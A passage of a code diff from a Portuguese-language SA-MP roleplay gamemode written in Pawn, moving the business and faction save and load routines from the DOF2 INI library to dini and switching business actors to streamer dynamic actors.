 	GaragemLabel[id] = CreateDynamic3DTextLabel(label, COLOR_WHITE, hInfo[id][GaragemEnterX], hInfo[id][GaragemEnterY], hInfo[id][GaragemEnterZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
 
@@ -12012,81 +12017,79 @@ public CarregarBizzes()
 	{
 	    if(i == 0) continue;
 
-    	format(ficheiro, sizeof(ficheiro), "PCRP/Business/%d.ini", i);
-    	if(!DOF2_FileExists(ficheiro))
+    	format(ficheiro, sizeof(ficheiro), "PCRP/Bizzes/%d.ini", i);
+    	if(!dini_Exists(ficheiro))
   		{
-	  		DOF2_CreateFile(ficheiro);
+	  		dini_Create(ficheiro);
 
-            DOF2_SetInt(ficheiro, "ID", i);
-            DOF2_SetString(ficheiro, "Nome", "Unused");
-            DOF2_SetString(ficheiro, "Owner", "Ninguém");
-            DOF2_SetInt(ficheiro, "Type", 0);
-  			DOF2_SetFloat(ficheiro, "EnterX", 0);
-  			DOF2_SetFloat(ficheiro, "EnterY", 0);
-  			DOF2_SetFloat(ficheiro, "EnterZ", 0);
-  			DOF2_SetFloat(ficheiro, "EnterAngle", 0);
-  			DOF2_SetInt(ficheiro, "EnterInterior", 0);
-  			DOF2_SetInt(ficheiro, "EnterVirtualWorld", 0);
-  			DOF2_SetInt(ficheiro, "Interior", 0);
-  			DOF2_SetInt(ficheiro, "VirtualWorld", i);
-  			DOF2_SetInt(ficheiro, "Comprada", 0);
-            DOF2_SetInt(ficheiro, "Price", 0);
-            DOF2_SetInt(ficheiro, "Locked", 1);
-            DOF2_SetInt(ficheiro, "Produtos", 0);
-            DOF2_SetInt(ficheiro, "Bank", 0);
-            DOF2_SetInt(ficheiro, "PickupID", 0);
-            DOF2_SetInt(ficheiro, "Entrada", 0);
-            DOF2_SetFloat(ficheiro, "ExitX", 0);
-            DOF2_SetFloat(ficheiro, "ExitY", 0);
-            DOF2_SetFloat(ficheiro, "ExitZ", 0);
-            DOF2_SetFloat(ficheiro, "ExitAngle", 0);
-            DOF2_SetInt(ficheiro, "Seguradora", 0);
-            DOF2_SetFloat(ficheiro, "ActorX", 0);
-            DOF2_SetFloat(ficheiro, "ActorY", 0);
-            DOF2_SetFloat(ficheiro, "ActorZ", 0);
-            DOF2_SetFloat(ficheiro, "ActorAngle", 0);
-            DOF2_SetInt(ficheiro, "ActorModel", 1);
-            
-    		DOF2_SaveFile();
+            dini_IntSet(ficheiro, "ID", i);
+            dini_Set(ficheiro, "Nome", "Unused");
+            dini_Set(ficheiro, "Owner", "Ninguém");
+            dini_IntSet(ficheiro, "Type", 0);
+  			dini_FloatSet(ficheiro, "EnterX", 0);
+  			dini_FloatSet(ficheiro, "EnterY", 0);
+  			dini_FloatSet(ficheiro, "EnterZ", 0);
+  			dini_FloatSet(ficheiro, "EnterAngle", 0);
+  			dini_IntSet(ficheiro, "EnterInterior", 0);
+  			dini_IntSet(ficheiro, "EnterVirtualWorld", 0);
+  			dini_IntSet(ficheiro, "Interior", 0);
+  			dini_IntSet(ficheiro, "VirtualWorld", i);
+  			dini_IntSet(ficheiro, "Comprada", 0);
+            dini_IntSet(ficheiro, "Price", 0);
+            dini_IntSet(ficheiro, "Locked", 1);
+            dini_IntSet(ficheiro, "Produtos", 0);
+            dini_IntSet(ficheiro, "Bank", 0);
+            dini_IntSet(ficheiro, "PickupID", 0);
+            dini_IntSet(ficheiro, "Entrada", 0);
+            dini_FloatSet(ficheiro, "ExitX", 0);
+            dini_FloatSet(ficheiro, "ExitY", 0);
+            dini_FloatSet(ficheiro, "ExitZ", 0);
+            dini_FloatSet(ficheiro, "ExitAngle", 0);
+            dini_IntSet(ficheiro, "Seguradora", 0);
+            dini_FloatSet(ficheiro, "ActorX", 0);
+            dini_FloatSet(ficheiro, "ActorY", 0);
+            dini_FloatSet(ficheiro, "ActorZ", 0);
+            dini_FloatSet(ficheiro, "ActorAngle", 0);
+            dini_IntSet(ficheiro, "ActorModel", 1);
    		}
    		else
    		{
-   		    cInfo[i][ID] = DOF2_GetInt(ficheiro, "ID");
-   		    format(bInfo[i][Nome], 32, "%s", DOF2_GetString(ficheiro, "Nome"));
-   		    format(bInfo[i][Owner], 32, "%s", DOF2_GetString(ficheiro, "Owner"));
-   		    bInfo[i][Type] = DOF2_GetInt(ficheiro, "Type");
-   		    bInfo[i][EnterX] = DOF2_GetFloat(ficheiro, "EnterX");
-   		    bInfo[i][EnterY] = DOF2_GetFloat(ficheiro, "EnterY");
-   		    bInfo[i][EnterZ] = DOF2_GetFloat(ficheiro, "EnterZ");
-   		    bInfo[i][EnterAngle] = DOF2_GetFloat(ficheiro, "EnterAngle");
-   		    bInfo[i][EnterInterior] = DOF2_GetInt(ficheiro, "EnterInterior");
-   		    bInfo[i][EnterVirtualWorld] = DOF2_GetInt(ficheiro, "EnterVirtualWorld");
-   		    bInfo[i][Interior] = DOF2_GetInt(ficheiro, "Interior");
-   		    bInfo[i][VirtualWorld] = DOF2_GetInt(ficheiro, "VirtualWorld");
-   		    bInfo[i][Comprada] = DOF2_GetInt(ficheiro, "Comprada");
-   		    bInfo[i][Price] = DOF2_GetInt(ficheiro, "Price");
-   		    bInfo[i][Locked] = DOF2_GetInt(ficheiro, "Locked");
-   		    bInfo[i][Produtos] = DOF2_GetInt(ficheiro, "Produtos");
-   		    bInfo[i][Bank] = DOF2_GetInt(ficheiro, "Bank");
-   		    bInfo[i][PickupID] = DOF2_GetInt(ficheiro, "PickupID");
-   		    bInfo[i][Entrada] = DOF2_GetInt(ficheiro, "Entrada");
-   		    bInfo[i][ExitX] = DOF2_GetFloat(ficheiro, "ExitX");
-   		    bInfo[i][ExitY] = DOF2_GetFloat(ficheiro, "ExitY");
-   		    bInfo[i][ExitZ] = DOF2_GetFloat(ficheiro, "ExitZ");
-   		    bInfo[i][ExitAngle] = DOF2_GetFloat(ficheiro, "ExitAngle");
-   		    bInfo[i][Seguradora] = DOF2_GetInt(ficheiro, "Seguradora");
-   		    bInfo[i][ActorX] = DOF2_GetFloat(ficheiro, "ActorX");
-   		    bInfo[i][ActorY] = DOF2_GetFloat(ficheiro, "ActorY");
-   		    bInfo[i][ActorZ] = DOF2_GetFloat(ficheiro, "ActorZ");
-   		    bInfo[i][ActorAngle] = DOF2_GetFloat(ficheiro, "ActorAngle");
-   		    bInfo[i][ActorModel] = DOF2_GetInt(ficheiro, "ActorModel");
+   		    cInfo[i][ID] = dini_Int(ficheiro, "ID");
+   		    format(bInfo[i][Nome], 32, "%s", dini_Get(ficheiro, "Nome"));
+   		    format(bInfo[i][Owner], 32, "%s", dini_Get(ficheiro, "Owner"));
+   		    bInfo[i][Type] = dini_Int(ficheiro, "Type");
+   		    bInfo[i][EnterX] = dini_Float(ficheiro, "EnterX");
+   		    bInfo[i][EnterY] = dini_Float(ficheiro, "EnterY");
+   		    bInfo[i][EnterZ] = dini_Float(ficheiro, "EnterZ");
+   		    bInfo[i][EnterAngle] = dini_Float(ficheiro, "EnterAngle");
+   		    bInfo[i][EnterInterior] = dini_Int(ficheiro, "EnterInterior");
+   		    bInfo[i][EnterVirtualWorld] = dini_Int(ficheiro, "EnterVirtualWorld");
+   		    bInfo[i][Interior] = dini_Int(ficheiro, "Interior");
+   		    bInfo[i][VirtualWorld] = dini_Int(ficheiro, "VirtualWorld");
+   		    bInfo[i][Comprada] = dini_Int(ficheiro, "Comprada");
+   		    bInfo[i][Price] = dini_Int(ficheiro, "Price");
+   		    bInfo[i][Locked] = dini_Int(ficheiro, "Locked");
+   		    bInfo[i][Produtos] = dini_Int(ficheiro, "Produtos");
+   		    bInfo[i][Bank] = dini_Int(ficheiro, "Bank");
+   		    bInfo[i][PickupID] = dini_Int(ficheiro, "PickupID");
+   		    bInfo[i][Entrada] = dini_Int(ficheiro, "Entrada");
+   		    bInfo[i][ExitX] = dini_Float(ficheiro, "ExitX");
+   		    bInfo[i][ExitY] = dini_Float(ficheiro, "ExitY");
+   		    bInfo[i][ExitZ] = dini_Float(ficheiro, "ExitZ");
+   		    bInfo[i][ExitAngle] = dini_Float(ficheiro, "ExitAngle");
+   		    bInfo[i][Seguradora] = dini_Int(ficheiro, "Seguradora");
+   		    bInfo[i][ActorX] = dini_Float(ficheiro, "ActorX");
+   		    bInfo[i][ActorY] = dini_Float(ficheiro, "ActorY");
+   		    bInfo[i][ActorZ] = dini_Float(ficheiro, "ActorZ");
+   		    bInfo[i][ActorAngle] = dini_Float(ficheiro, "ActorAngle");
+   		    bInfo[i][ActorModel] = dini_Int(ficheiro, "ActorModel");
 		}
 		AtualizarBiz(i);
 	}
-	
+
 	tick2 = GetTickCount();
-	printf("\n [PC:RP] Lojas carregadas (%d ms)", tick2-tick1);
-	
+	printf(" [PC:RP] Lojas carregadas (%d ms)", tick2-tick1);
+
 	return 1;
 }
 
@@ -12096,39 +12099,37 @@ public GuardarBizzes()
 	for(new i = 0; i < MAX_BUSINESS; i++)
 	{
 	    if(i == 0) continue;
-	    format(ficheiro, sizeof(ficheiro), "PCRP/Business/%d.ini", i);
+	    format(ficheiro, sizeof(ficheiro), "PCRP/Bizzes/%d.ini", i);
 
-		DOF2_SetInt(ficheiro, "ID", i);
-  		DOF2_SetString(ficheiro, "Nome", bInfo[i][Nome]);
-    	DOF2_SetString(ficheiro, "Owner", bInfo[i][Owner]);
-     	DOF2_SetInt(ficheiro, "Type", bInfo[i][Type]);
-  		DOF2_SetFloat(ficheiro, "EnterX", bInfo[i][EnterX]);
-  		DOF2_SetFloat(ficheiro, "EnterY", bInfo[i][EnterY]);
-		DOF2_SetFloat(ficheiro, "EnterZ", bInfo[i][EnterZ]);
-		DOF2_SetFloat(ficheiro, "EnterAngle", bInfo[i][EnterAngle]);
-		DOF2_SetInt(ficheiro, "EnterInterior", bInfo[i][EnterInterior]);
-		DOF2_SetInt(ficheiro, "EnterVirtualWorld", bInfo[i][EnterVirtualWorld]);
-		DOF2_SetInt(ficheiro, "Interior", bInfo[i][Interior]);
-		DOF2_SetInt(ficheiro, "VirtualWorld", bInfo[i][VirtualWorld]);
-		DOF2_SetInt(ficheiro, "Comprada", bInfo[i][Comprada]);
-		DOF2_SetInt(ficheiro, "Price", bInfo[i][Price]);
-  		DOF2_SetInt(ficheiro, "Locked", bInfo[i][Locked]);
-  		DOF2_SetInt(ficheiro, "Produtos", bInfo[i][Produtos]);
-  		DOF2_SetInt(ficheiro, "Bank", bInfo[i][Bank]);
-  		DOF2_SetInt(ficheiro, "PickupID", bInfo[i][PickupID]);
-  		DOF2_SetInt(ficheiro, "Entrada", bInfo[i][Entrada]);
-        DOF2_SetFloat(ficheiro, "ExitX", bInfo[i][ExitX]);
-        DOF2_SetFloat(ficheiro, "ExitY", bInfo[i][ExitY]);
-        DOF2_SetFloat(ficheiro, "ExitZ", bInfo[i][ExitZ]);
-        DOF2_SetFloat(ficheiro, "ExitAngle", bInfo[i][ExitAngle]);
-        DOF2_SetInt(ficheiro, "Seguradora", bInfo[i][Seguradora]);
-        DOF2_SetFloat(ficheiro, "ActorX", bInfo[i][ActorX]);
-        DOF2_SetFloat(ficheiro, "ActorY", bInfo[i][ActorY]);
-        DOF2_SetFloat(ficheiro, "ActorZ", bInfo[i][ActorZ]);
-        DOF2_SetFloat(ficheiro, "ActorAngle", bInfo[i][ActorAngle]);
-        DOF2_SetInt(ficheiro, "ActorModel", bInfo[i][ActorModel]);
-
-		DOF2_SaveFile();
+		dini_IntSet(ficheiro, "ID", i);
+  		dini_Set(ficheiro, "Nome", bInfo[i][Nome]);
+    	dini_Set(ficheiro, "Owner", bInfo[i][Owner]);
+     	dini_IntSet(ficheiro, "Type", bInfo[i][Type]);
+  		dini_FloatSet(ficheiro, "EnterX", bInfo[i][EnterX]);
+  		dini_FloatSet(ficheiro, "EnterY", bInfo[i][EnterY]);
+		dini_FloatSet(ficheiro, "EnterZ", bInfo[i][EnterZ]);
+		dini_FloatSet(ficheiro, "EnterAngle", bInfo[i][EnterAngle]);
+		dini_IntSet(ficheiro, "EnterInterior", bInfo[i][EnterInterior]);
+		dini_IntSet(ficheiro, "EnterVirtualWorld", bInfo[i][EnterVirtualWorld]);
+		dini_IntSet(ficheiro, "Interior", bInfo[i][Interior]);
+		dini_IntSet(ficheiro, "VirtualWorld", bInfo[i][VirtualWorld]);
+		dini_IntSet(ficheiro, "Comprada", bInfo[i][Comprada]);
+		dini_IntSet(ficheiro, "Price", bInfo[i][Price]);
+  		dini_IntSet(ficheiro, "Locked", bInfo[i][Locked]);
+  		dini_IntSet(ficheiro, "Produtos", bInfo[i][Produtos]);
+  		dini_IntSet(ficheiro, "Bank", bInfo[i][Bank]);
+  		dini_IntSet(ficheiro, "PickupID", bInfo[i][PickupID]);
+  		dini_IntSet(ficheiro, "Entrada", bInfo[i][Entrada]);
+        dini_FloatSet(ficheiro, "ExitX", bInfo[i][ExitX]);
+        dini_FloatSet(ficheiro, "ExitY", bInfo[i][ExitY]);
+        dini_FloatSet(ficheiro, "ExitZ", bInfo[i][ExitZ]);
+        dini_FloatSet(ficheiro, "ExitAngle", bInfo[i][ExitAngle]);
+        dini_IntSet(ficheiro, "Seguradora", bInfo[i][Seguradora]);
+        dini_FloatSet(ficheiro, "ActorX", bInfo[i][ActorX]);
+        dini_FloatSet(ficheiro, "ActorY", bInfo[i][ActorY]);
+        dini_FloatSet(ficheiro, "ActorZ", bInfo[i][ActorZ]);
+        dini_FloatSet(ficheiro, "ActorAngle", bInfo[i][ActorAngle]);
+        dini_IntSet(ficheiro, "ActorModel", bInfo[i][ActorModel]);
 
 	}
 	return 1;
@@ -12139,38 +12140,36 @@ public GuardarBizz(id)
 	new i = id;
 	new ficheiro[64];
 
-	format(ficheiro, sizeof(ficheiro), "PCRP/Business/%d.ini", i);
+	format(ficheiro, sizeof(ficheiro), "PCRP/Bizzes/%d.ini", i);
 
-	DOF2_SetInt(ficheiro, "ID", i);
-	DOF2_SetString(ficheiro, "Nome", bInfo[i][Nome]);
-	DOF2_SetString(ficheiro, "Owner", bInfo[i][Owner]);
-	DOF2_SetInt(ficheiro, "Type", bInfo[i][Type]);
-	DOF2_SetFloat(ficheiro, "EnterX", bInfo[i][EnterX]);
-	DOF2_SetFloat(ficheiro, "EnterY", bInfo[i][EnterY]);
-	DOF2_SetFloat(ficheiro, "EnterZ", bInfo[i][EnterZ]);
-	DOF2_SetInt(ficheiro, "EnterInterior", bInfo[i][EnterInterior]);
-	DOF2_SetInt(ficheiro, "EnterVirtualWorld", bInfo[i][EnterVirtualWorld]);
-	DOF2_SetInt(ficheiro, "Interior", bInfo[i][Interior]);
-	DOF2_SetInt(ficheiro, "VirtualWorld", bInfo[i][VirtualWorld]);
-	DOF2_SetInt(ficheiro, "Comprada", bInfo[i][Comprada]);
-	DOF2_SetInt(ficheiro, "Price", bInfo[i][Price]);
-	DOF2_SetInt(ficheiro, "Locked", bInfo[i][Locked]);
-  	DOF2_SetInt(ficheiro, "Produtos", bInfo[i][Produtos]);
-	DOF2_SetInt(ficheiro, "Bank", bInfo[i][Bank]);
-	DOF2_SetInt(ficheiro, "PickupID", bInfo[i][PickupID]);
-	DOF2_SetInt(ficheiro, "Entrada", bInfo[i][Entrada]);
- 	DOF2_SetFloat(ficheiro, "ExitX", bInfo[i][ExitX]);
- 	DOF2_SetFloat(ficheiro, "ExitY", bInfo[i][ExitY]);
- 	DOF2_SetFloat(ficheiro, "ExitZ", bInfo[i][ExitZ]);
- 	DOF2_SetFloat(ficheiro, "ExitAngle", bInfo[i][ExitAngle]);
- 	DOF2_SetInt(ficheiro, "Seguradora", bInfo[i][Seguradora]);
-  	DOF2_SetFloat(ficheiro, "ActorX", bInfo[i][ActorX]);
- 	DOF2_SetFloat(ficheiro, "ActorY", bInfo[i][ActorY]);
- 	DOF2_SetFloat(ficheiro, "ActorZ", bInfo[i][ActorZ]);
- 	DOF2_SetFloat(ficheiro, "ActorAngle", bInfo[i][ActorAngle]);
- 	DOF2_SetInt(ficheiro, "ActorModel", bInfo[i][ActorModel]);
- 	
-	DOF2_SaveFile();
+	dini_IntSet(ficheiro, "ID", i);
+	dini_Set(ficheiro, "Nome", bInfo[i][Nome]);
+	dini_Set(ficheiro, "Owner", bInfo[i][Owner]);
+	dini_IntSet(ficheiro, "Type", bInfo[i][Type]);
+	dini_FloatSet(ficheiro, "EnterX", bInfo[i][EnterX]);
+	dini_FloatSet(ficheiro, "EnterY", bInfo[i][EnterY]);
+	dini_FloatSet(ficheiro, "EnterZ", bInfo[i][EnterZ]);
+	dini_IntSet(ficheiro, "EnterInterior", bInfo[i][EnterInterior]);
+	dini_IntSet(ficheiro, "EnterVirtualWorld", bInfo[i][EnterVirtualWorld]);
+	dini_IntSet(ficheiro, "Interior", bInfo[i][Interior]);
+	dini_IntSet(ficheiro, "VirtualWorld", bInfo[i][VirtualWorld]);
+	dini_IntSet(ficheiro, "Comprada", bInfo[i][Comprada]);
+	dini_IntSet(ficheiro, "Price", bInfo[i][Price]);
+	dini_IntSet(ficheiro, "Locked", bInfo[i][Locked]);
+  	dini_IntSet(ficheiro, "Produtos", bInfo[i][Produtos]);
+	dini_IntSet(ficheiro, "Bank", bInfo[i][Bank]);
+	dini_IntSet(ficheiro, "PickupID", bInfo[i][PickupID]);
+	dini_IntSet(ficheiro, "Entrada", bInfo[i][Entrada]);
+ 	dini_FloatSet(ficheiro, "ExitX", bInfo[i][ExitX]);
+ 	dini_FloatSet(ficheiro, "ExitY", bInfo[i][ExitY]);
+ 	dini_FloatSet(ficheiro, "ExitZ", bInfo[i][ExitZ]);
+ 	dini_FloatSet(ficheiro, "ExitAngle", bInfo[i][ExitAngle]);
+ 	dini_IntSet(ficheiro, "Seguradora", bInfo[i][Seguradora]);
+  	dini_FloatSet(ficheiro, "ActorX", bInfo[i][ActorX]);
+ 	dini_FloatSet(ficheiro, "ActorY", bInfo[i][ActorY]);
+ 	dini_FloatSet(ficheiro, "ActorZ", bInfo[i][ActorZ]);
+ 	dini_FloatSet(ficheiro, "ActorAngle", bInfo[i][ActorAngle]);
+ 	dini_IntSet(ficheiro, "ActorModel", bInfo[i][ActorModel]);
 
 	return 1;
 }
@@ -12219,24 +12218,18 @@ public AtualizarBiz(id)
 
 	BizPickup[id] = CreateDynamicPickup(bInfo[id][PickupID], 1, bInfo[id][EnterX], bInfo[id][EnterY], bInfo[id][EnterZ], -1, -1, -1, 100.0);
 	BizLabel[id] = CreateDynamic3DTextLabel(label, COLOR_WHITE, bInfo[id][EnterX], bInfo[id][EnterY], bInfo[id][EnterZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
-	
+
 	if(bInfo[id][ActorX] != 0 && bInfo[id][ActorY] != 0) // azeite
 	{
-	    if(ActorFirstTime[id] == false)
-	    {
- 	  		DestroyActor(BizActor[id]);
-	  		DestroyDynamic3DTextLabel(ActorLabel[id]);
-	    }
-  		
-		BizActor[id] = CreateActor(bInfo[id][ActorModel], bInfo[id][ActorX], bInfo[id][ActorY], bInfo[id][ActorZ], bInfo[id][ActorAngle]);
-        ActorLabel[id] = CreateDynamic3DTextLabel("{FF9900}[ {00FF00}'n' {FF0000}para abrir o menu {FF9900}]", COLOR_WHITE, bInfo[id][ActorX], bInfo[id][ActorY], bInfo[id][ActorZ]+1, 12, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
+	    DestroyDynamicActor(BizActor[id]);
+
+		BizActor[id] = CreateDynamicActor(bInfo[id][ActorModel], bInfo[id][ActorX], bInfo[id][ActorY], bInfo[id][ActorZ], bInfo[id][ActorAngle], 1, 100.0, id, bInfo[id][Interior], -1, STREAMER_ACTOR_SD, -1, 0);
+		ActorLabel[id] = CreateDynamic3DTextLabel("{FF9900}[ {00FF00}'n' {FF0000}para abrir o menu {FF9900}]", COLOR_WHITE, bInfo[id][ActorX], bInfo[id][ActorY], bInfo[id][ActorZ]+1, 12, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
 
 	 	SetActorVirtualWorld(BizActor[id], id);
 	 	SetActorInvulnerable(BizActor[id], true);
-	 	
-	 	ActorFirstTime[id] = true;
 	}
- 	
+
 	return 1;
 }
 
@@ -12253,88 +12246,86 @@ public CarregarFactions()
 	    if(i == 0) continue;
 
     	format(ficheiro, sizeof(ficheiro), "PCRP/Factions/%d.ini", i);
-    	if(!DOF2_FileExists(ficheiro))
+    	if(!dini_Exists(ficheiro))
   		{
-	  		DOF2_CreateFile(ficheiro);
+	  		dini_Create(ficheiro);
 
-            DOF2_SetString(ficheiro, "Nome", "Unused");
-            DOF2_SetInt(ficheiro, "Type", 0);
-            DOF2_SetInt(ficheiro, "Legal", 0);
-            DOF2_SetInt(ficheiro, "Bank", 0);
-  			DOF2_SetFloat(ficheiro, "X", 0);
-  			DOF2_SetFloat(ficheiro, "Y", 0);
-  			DOF2_SetFloat(ficheiro, "Z", 0);
-            DOF2_SetFloat(ficheiro, "A", 0);
-  			DOF2_SetString(ficheiro, "Rank1", "Unused");
-  			DOF2_SetString(ficheiro, "Rank2", "Unused");
-  			DOF2_SetString(ficheiro, "Rank3", "Unused");
-  			DOF2_SetString(ficheiro, "Rank4", "Unused");
-  			DOF2_SetString(ficheiro, "Rank5", "Unused");
-  			DOF2_SetString(ficheiro, "Rank6", "Unused");
-  			DOF2_SetInt(ficheiro, "SalarioRank1", 0);
-  			DOF2_SetInt(ficheiro, "SalarioRank2", 0);
-  			DOF2_SetInt(ficheiro, "SalarioRank3", 0);
-  			DOF2_SetInt(ficheiro, "SalarioRank4", 0);
-  			DOF2_SetInt(ficheiro, "SalarioRank5", 0);
-  			DOF2_SetInt(ficheiro, "SalarioRank6", 0);
-  			DOF2_SetInt(ficheiro, "SkinRank1", 0);
-  			DOF2_SetInt(ficheiro, "SkinRank2", 0);
-  			DOF2_SetInt(ficheiro, "SkinRank3", 0);
-  			DOF2_SetInt(ficheiro, "SkinRank4", 0);
-  			DOF2_SetInt(ficheiro, "SkinRank5", 0);
-  			DOF2_SetInt(ficheiro, "SkinRank6", 0);
-  			DOF2_SetInt(ficheiro, "JoinRank", 0);
-  			DOF2_SetString(ficheiro, "Color", "-1");
-  			DOF2_SetInt(ficheiro, "UseDuty", 0);
-  			DOF2_SetFloat(ficheiro, "DutyX", 0);
-  			DOF2_SetFloat(ficheiro, "DutyY", 0);
-  			DOF2_SetFloat(ficheiro, "DutyZ", 0);
-  			DOF2_SetInt(ficheiro, "DutyVirtualWorld", 0);
-  			DOF2_SetInt(ficheiro, "DutyInterior", 0);
-
-    		DOF2_SaveFile();
+            dini_Set(ficheiro, "Nome", "Unused");
+            dini_IntSet(ficheiro, "Type", 0);
+            dini_IntSet(ficheiro, "Legal", 0);
+            dini_IntSet(ficheiro, "Bank", 0);
+  			dini_FloatSet(ficheiro, "X", 0);
+  			dini_FloatSet(ficheiro, "Y", 0);
+  			dini_FloatSet(ficheiro, "Z", 0);
+            dini_FloatSet(ficheiro, "A", 0);
+  			dini_Set(ficheiro, "Rank1", "Unused");
+  			dini_Set(ficheiro, "Rank2", "Unused");
+  			dini_Set(ficheiro, "Rank3", "Unused");
+  			dini_Set(ficheiro, "Rank4", "Unused");
+  			dini_Set(ficheiro, "Rank5", "Unused");
+  			dini_Set(ficheiro, "Rank6", "Unused");
+  			dini_IntSet(ficheiro, "SalarioRank1", 0);
+  			dini_IntSet(ficheiro, "SalarioRank2", 0);
+  			dini_IntSet(ficheiro, "SalarioRank3", 0);
+  			dini_IntSet(ficheiro, "SalarioRank4", 0);
+  			dini_IntSet(ficheiro, "SalarioRank5", 0);
+  			dini_IntSet(ficheiro, "SalarioRank6", 0);
+  			dini_IntSet(ficheiro, "SkinRank1", 0);
+  			dini_IntSet(ficheiro, "SkinRank2", 0);
+  			dini_IntSet(ficheiro, "SkinRank3", 0);
+  			dini_IntSet(ficheiro, "SkinRank4", 0);
+  			dini_IntSet(ficheiro, "SkinRank5", 0);
+  			dini_IntSet(ficheiro, "SkinRank6", 0);
+  			dini_IntSet(ficheiro, "JoinRank", 0);
+  			dini_Set(ficheiro, "Color", "-1");
+  			dini_IntSet(ficheiro, "UseDuty", 0);
+  			dini_FloatSet(ficheiro, "DutyX", 0);
+  			dini_FloatSet(ficheiro, "DutyY", 0);
+  			dini_FloatSet(ficheiro, "DutyZ", 0);
+  			dini_IntSet(ficheiro, "DutyVirtualWorld", 0);
+  			dini_IntSet(ficheiro, "DutyInterior", 0);
    		}
    		else
    		{
-   		    format(fInfo[i][Nome], 32, "%s", DOF2_GetString(ficheiro, "Nome"));
-   		    fInfo[i][Type] = DOF2_GetInt(ficheiro, "Type");
-   		    fInfo[i][Legal] = DOF2_GetInt(ficheiro, "Legal");
-   		    fInfo[i][Bank] = DOF2_GetInt(ficheiro, "Bank");
-   		    fInfo[i][X] = DOF2_GetFloat(ficheiro, "X");
-   		    fInfo[i][Y] = DOF2_GetFloat(ficheiro, "Y");
-   		    fInfo[i][Z] = DOF2_GetFloat(ficheiro, "Z");
-   		    fInfo[i][A] = DOF2_GetFloat(ficheiro, "A");
-   		    format(fInfo[i][Rank1], 32, "%s", DOF2_GetString(ficheiro, "Rank1"));
-   		    format(fInfo[i][Rank2], 32, "%s", DOF2_GetString(ficheiro, "Rank2"));
-   		    format(fInfo[i][Rank3], 32, "%s", DOF2_GetString(ficheiro, "Rank3"));
-   		    format(fInfo[i][Rank4], 32, "%s", DOF2_GetString(ficheiro, "Rank4"));
-   		    format(fInfo[i][Rank5], 32, "%s", DOF2_GetString(ficheiro, "Rank5"));
-   		    format(fInfo[i][Rank6], 32, "%s", DOF2_GetString(ficheiro, "Rank6"));
-   		    fInfo[i][SalarioRank1] = DOF2_GetInt(ficheiro, "SalarioRank1");
-   		    fInfo[i][SalarioRank2] = DOF2_GetInt(ficheiro, "SalarioRank2");
-   		    fInfo[i][SalarioRank3] = DOF2_GetInt(ficheiro, "SalarioRank3");
-   		    fInfo[i][SalarioRank4] = DOF2_GetInt(ficheiro, "SalarioRank4");
-   		    fInfo[i][SalarioRank5] = DOF2_GetInt(ficheiro, "SalarioRank5");
-   		    fInfo[i][SalarioRank6] = DOF2_GetInt(ficheiro, "SalarioRank6");
-   		    fInfo[i][SkinRank1] = DOF2_GetInt(ficheiro, "SkinRank1");
-   		    fInfo[i][SkinRank2] = DOF2_GetInt(ficheiro, "SkinRank2");
-   		    fInfo[i][SkinRank3] = DOF2_GetInt(ficheiro, "SkinRank3");
-   		    fInfo[i][SkinRank4] = DOF2_GetInt(ficheiro, "SkinRank4");
-   		    fInfo[i][SkinRank5] = DOF2_GetInt(ficheiro, "SkinRank5");
-   		    fInfo[i][SkinRank6] = DOF2_GetInt(ficheiro, "SkinRank6");
-   		    fInfo[i][JoinRank] = DOF2_GetInt(ficheiro, "JoinRank");
-   		    format(fInfo[i][Color], 32, "%s", DOF2_GetString(ficheiro, "Color"));
-   		    fInfo[i][UseDuty] = DOF2_GetInt(ficheiro, "UseDuty");
-   		    fInfo[i][DutyX] = DOF2_GetFloat(ficheiro, "DutyX");
-   		    fInfo[i][DutyY] = DOF2_GetFloat(ficheiro, "DutyY");
-   		    fInfo[i][DutyZ] = DOF2_GetFloat(ficheiro, "DutyZ");
-   		    fInfo[i][DutyVirtualWorld] = DOF2_GetInt(ficheiro, "DutyVirtualWorld");
-   		    fInfo[i][DutyInterior] = DOF2_GetInt(ficheiro, "DutyInterior");
+   		    format(fInfo[i][Nome], 32, "%s", dini_Get(ficheiro, "Nome"));
+   		    fInfo[i][Type] = dini_Int(ficheiro, "Type");
+   		    fInfo[i][Legal] = dini_Int(ficheiro, "Legal");
+   		    fInfo[i][Bank] = dini_Int(ficheiro, "Bank");
+   		    fInfo[i][X] = dini_Float(ficheiro, "X");
+   		    fInfo[i][Y] = dini_Float(ficheiro, "Y");
+   		    fInfo[i][Z] = dini_Float(ficheiro, "Z");
+   		    fInfo[i][A] = dini_Float(ficheiro, "A");
+   		    format(fInfo[i][Rank1], 32, "%s", dini_Get(ficheiro, "Rank1"));
+   		    format(fInfo[i][Rank2], 32, "%s", dini_Get(ficheiro, "Rank2"));
+   		    format(fInfo[i][Rank3], 32, "%s", dini_Get(ficheiro, "Rank3"));
+   		    format(fInfo[i][Rank4], 32, "%s", dini_Get(ficheiro, "Rank4"));
+   		    format(fInfo[i][Rank5], 32, "%s", dini_Get(ficheiro, "Rank5"));
+   		    format(fInfo[i][Rank6], 32, "%s", dini_Get(ficheiro, "Rank6"));
+   		    fInfo[i][SalarioRank1] = dini_Int(ficheiro, "SalarioRank1");
+   		    fInfo[i][SalarioRank2] = dini_Int(ficheiro, "SalarioRank2");
+   		    fInfo[i][SalarioRank3] = dini_Int(ficheiro, "SalarioRank3");
+   		    fInfo[i][SalarioRank4] = dini_Int(ficheiro, "SalarioRank4");
+   		    fInfo[i][SalarioRank5] = dini_Int(ficheiro, "SalarioRank5");
+   		    fInfo[i][SalarioRank6] = dini_Int(ficheiro, "SalarioRank6");
+   		    fInfo[i][SkinRank1] = dini_Int(ficheiro, "SkinRank1");
+   		    fInfo[i][SkinRank2] = dini_Int(ficheiro, "SkinRank2");
+   		    fInfo[i][SkinRank3] = dini_Int(ficheiro, "SkinRank3");
+   		    fInfo[i][SkinRank4] = dini_Int(ficheiro, "SkinRank4");
+   		    fInfo[i][SkinRank5] = dini_Int(ficheiro, "SkinRank5");
+   		    fInfo[i][SkinRank6] = dini_Int(ficheiro, "SkinRank6");
+   		    fInfo[i][JoinRank] = dini_Int(ficheiro, "JoinRank");
+   		    format(fInfo[i][Color], 32, "%s", dini_Get(ficheiro, "Color"));
+   		    fInfo[i][UseDuty] = dini_Int(ficheiro, "UseDuty");
